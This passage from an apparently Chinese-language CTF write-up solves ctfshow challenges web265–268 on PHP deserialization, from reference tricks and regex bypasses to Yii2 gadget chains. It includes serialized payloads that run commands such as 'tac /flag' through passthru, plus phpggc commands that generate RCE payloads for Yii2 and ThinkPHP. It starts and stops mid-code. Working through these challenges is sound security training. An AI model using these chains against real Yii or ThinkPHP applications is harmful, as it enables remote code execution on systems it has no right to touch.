class="title">ctfshowAdmin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$t</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token=<span class="variable">$t</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;token===<span class="keyword">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ctfshow</span> = unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br><span class="line"><span class="variable">$ctfshow</span>-&gt;token=md5(mt_rand());</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctfshow</span>-&gt;login())&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>考察php按地址传参    看了一下代码逻辑，很显然，`$ctfshow`接收传进来的反序列化内容，然后把类中的token赋值为随机数。然后调用`login`方法，只有`token===password`才会输出flag；而我们怎么才能定义`password`的内容等于我们未知的随机数呢？我们可以采用php变量引用的方式<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> =&amp;<span class="variable">$b</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>> 注意：$a和$b是指向同一个地方，而不是$a指向了$b，亦或$b指向$a所以payload为<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#-- coding: utf-8 --</span></span><br><span class="line"><span class="comment">#Author: MTRleed</span></span><br><span class="line"><span class="comment">#file: web265.php</span></span><br><span class="line"><span class="comment">#time: 2023/11/7 11:36</span></span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowAdmin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span> = <span class="string">&quot;mtrleed&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&quot;mtrleed&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;token===<span class="keyword">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> ctfshowAdmin();</span><br><span class="line"><span class="variable">$a</span> -&gt;token=&amp;<span class="variable">$a</span> -&gt;password;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>### web266<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-04 23:52:24</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-05 00:17:08</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$cs</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;username===<span class="keyword">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;username;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ctfshowo</span>=@unserialize(<span class="variable">$cs</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/ctfshow/&#x27;</span>, <span class="variable">$cs</span>))&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Error <span class="subst">$ctfshowo</span>&quot;</span>,<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>这题的话只要绕一个正则就行，绕过了自然在结束的时候触发`__destruct`魔术方法输出flag。有的同学问这里怎么传参，还不知道的同学该去复习一下文件包含专题啦。<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;username===<span class="keyword">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = serialize(<span class="keyword">new</span> ctfshow());</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br></pre></td></tr></table></figure>运行后得到<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:7:&quot;ctfshow&quot;:2:&#123;s:8:&quot;username&quot;;s:6:&quot;xxxxxx&quot;;s:8:&quot;password&quot;;s:6:&quot;xxxxxx&quot;;&#125;</span><br></pre></td></tr></table></figure>ctfshow 这任意大写一个字母即可绕过正则![](https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web265.png)### web267(Yii反序列化漏洞)打开是这样一个页面![](https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web267.png)在login页面 admin:admin 弱口令登录成功，但是没什么有用信息![](https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web267-1.png)在about页面查看源代码发现提示![](https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web267-2.png)那么我们访问 `/index.php?r=site%2Fabout&view-source`看看，发现一点有用信息，注释说是一个后门![](https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web267-3.png)应该是直接访问`/backdoor/shell`然后构造命令，但是信息收集不够，还不具备条件继续信息收集发现是yii，![](https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web267-4.png)![](https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web267-5.png)参考博客 [yii反序列化漏洞复现及利用.mhtml](离线网页\yii反序列化漏洞复现及利用.mhtml) <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;phpinfo&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;close&#x27;</span>] = [<span class="keyword">new</span> CreateAction(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">db</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_dataReader = <span class="keyword">new</span> <span class="built_in">Generator</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title">echo</span> <span class="title">base64_encode</span>(<span class="title">serialize</span>(<span class="title">new</span> <span class="title">yii</span>\<span class="title">db</span>\<span class="title">BatchQueryResult</span>));</span><br><span class="line">    <span class="comment">//TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6NzoicGhwaW5mbyI7czoyOiJpZCI7czoxOiIxIjt9aToxO3M6MzoicnVuIjt9fX19</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>POC<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?r=/backdoor/shell&amp;code=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6NzoicGhwaW5mbyI7czoyOiJpZCI7czoxOiIxIjt9aToxO3M6MzoicnVuIjt9fX19</span><br></pre></td></tr></table></figure>成功回显 phpinfo![](https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web267-6.png)随便找个POC用一下，不过这题system不行，而且好像没回显？但是我用passthru可以有回显，发现用passthru可以直接rceexp<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;passthru&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;tac /flag&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;close&#x27;</span>] = [<span class="keyword">new</span> CreateAction(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">db</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_dataReader = <span class="keyword">new</span> <span class="built_in">Generator</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title">echo</span> <span class="title">base64_encode</span>(<span class="title">serialize</span>(<span class="title">new</span> <span class="title">yii</span>\<span class="title">db</span>\<span class="title">BatchQueryResult</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?r=/backdoor/shell&amp;code=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6ODoicGFzc3RocnUiO3M6MjoiaWQiO3M6OToidGFjIC9mbGFnIjt9aToxO3M6MzoicnVuIjt9fX19</span><br></pre></td></tr></table></figure>![](https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web267-7.png)还有别的链子，但是不一定有用，可以都试试链子2：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#-- coding: utf-8 --</span></span><br><span class="line"><span class="comment">#Author: MTRleed</span></span><br><span class="line"><span class="comment">#file: web268.php</span></span><br><span class="line"><span class="comment">#time: 2023/11/7 16:20</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;passthru&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;cat /fl*&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="comment">// 这里需要改为isRunning</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;render&#x27;</span>] = [<span class="keyword">new</span> CreateAction(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">phpDocumentor</span>\<span class="title">Reflection</span>\<span class="title">DocBlock</span>\<span class="title">Tags</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">See</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$description</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;description = <span class="keyword">new</span> <span class="built_in">Generator</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">phpDocumentor</span>\<span class="title">Reflection</span>\<span class="title">DocBlock</span>\<span class="title">Tags</span>\<span class="title">See</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Swift_KeyCache_DiskKeyCache</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$keys</span> = [];</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$path</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;path = <span class="keyword">new</span> See;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;keys = <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&quot;axin&quot;</span>=&gt;<span class="keyword">array</span>(<span class="string">&quot;is&quot;</span>=&gt;<span class="string">&quot;handsome&quot;</span>)</span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 生成poc</span></span><br><span class="line">    <span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> Swift_KeyCache_DiskKeyCache()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>还可以使用反序列化工具 `phpggc`可以生成想要的exp，可以看到 yii 反序列对应版本的payload和入口`phpggc -l`![](https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web267-8.png)随后命令语法：执行程序 框架名字 要执行的函数 具体的命令 什么编码格式比如：./phpggc ThinkPHP/RCE3 system() "cat /flag" --base64再比如：./phpggc Yii2/RCE1 exec 'cp /fla* test.txt' --url注意：如果题目需要你进行base64编码或者url编码，一定要在这个命令这完成编码，不要把结果复制了拿去其它工具上编，很有可能就错了，所以要编码就直接在这个命令后面加参数;不需要编码就不加后面的参数![](https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web267-9.png)![](https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web267-10.png)### web268(yii)如果继续使用上一条链子，需要修改一个地方，将flag写入另一个文件再访问<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;passthru&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;cp /fl* 